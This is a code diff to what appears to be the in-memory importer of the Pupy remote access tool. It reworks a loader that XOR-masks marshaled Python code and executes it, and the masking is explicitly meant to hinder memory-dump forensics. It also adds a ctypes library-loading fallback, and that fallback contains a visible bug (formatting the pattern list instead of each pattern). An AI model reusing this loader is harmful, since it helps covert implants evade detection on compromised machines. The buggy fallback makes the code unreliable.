@@ -42,21 +42,25 @@ def dprint(msg):
         __dprint_method(msg)
 
 def loadpy(src, dst, masked=False):
+    src = bytes(src)
     content = src
+
     if masked:
         # Poors man "obfuscation", just to reduce (a bit) amount of our
         # plaintext keys in mem dump
         content = bytearray(len(src))
         for i,x in enumerate(src):
-            content[i] = (x^((2**((65535-i)%65535))%251))
-        content = buffer(content)
+            content[i] = chr(ord(x)^((2**((65535-i)%65535))%251))
 
-    exec (marshal.loads(content), dst)
+    try:
+        exec (marshal.loads(buffer(content)), dst)
+    except Exception, e:
+        dprint("loadpy failed: {}".format(e))
+        exec (marshal.loads(bytes(content)), dst)
+
     del content
 
 def find_writable_folder():
-    import sys
-
     dprint('Search writable folder')
 
     if hasattr(sys, '__pupyimporter_writable_folder'):
@@ -109,7 +113,6 @@ def find_writable_folder():
 
 def get_tmpfile_function():
     from tempfile import mkstemp
-    import sys
     import platform
 
     if sys.platform.startswith('linux'):
@@ -666,7 +669,10 @@ def install(debug=None, trace=False):
     if trace:
         __trace = trace
 
-    gc.set_threshold(128)
+    try:
+        gc.set_threshold(128)
+    except NotImplementedError:
+        pass
 
     if allow_system_packages:
         dprint('Install pupyimporter + local packages')
@@ -704,17 +710,55 @@ def install(debug=None, trace=False):
             __trace = None
 
     import ctypes
-    import ctypes.util
+
+    have_ctypes_util = False
+    have_ctypes_dlopen = hasattr(ctypes, '_dlopen')
+
+    try:
+        import ctypes.util
+        have_ctypes_util = True
+    except ImportError:
+        pass
+
+
     import os
     import threading
 
     PupyPackageFinder.search_lock = threading.Lock()
 
-    ctypes._system_dlopen = ctypes._dlopen
-    ctypes.util._system_find_library = ctypes.util.find_library
+    if have_ctypes_dlopen:
+        ctypes._system_dlopen = ctypes._dlopen
 
-    if hasattr(ctypes.util, '_findLib_gcc'):
-        ctypes.util._findLib_gcc = lambda name: None
+    if have_ctypes_util:
+        ctypes.util._system_find_library = ctypes.util.find_library
+
+        if hasattr(ctypes.util, '_findLib_gcc'):
+            ctypes.util._findLib_gcc = lambda name: None
+    else:
+        ctypes_util = imp.new_module('ctypes.util')
+        ctypes_util.__name__ = 'pupy'
+        ctypes_util.__file__ = 'pupy://ctypes/util.pyV'
+        ctypes_util.__package__ = 'ctypes'
+        sys.modules['ctypes.util'] = ctypes_util
+
+        name_patterns = [
+            'lib{}.so', '{}.so',
+            'lib{}.pyd', '{}.pyd',
+            'lib{}.dll', '{}.dll',
+            'lib{}27.dll'
+        ]
+
+        # TODO: Add search paths
+
+        def find_library(name):
+            for pattern in name_patterns:
+                libname = name_patterns.format(name)
+                try:
+                    return ctypes.CDLL(libname)
+                except:
+                    pass
+
+        ctypes_util._system_find_library = find_library
 
     def pupy_make_path(name):
         if not name:
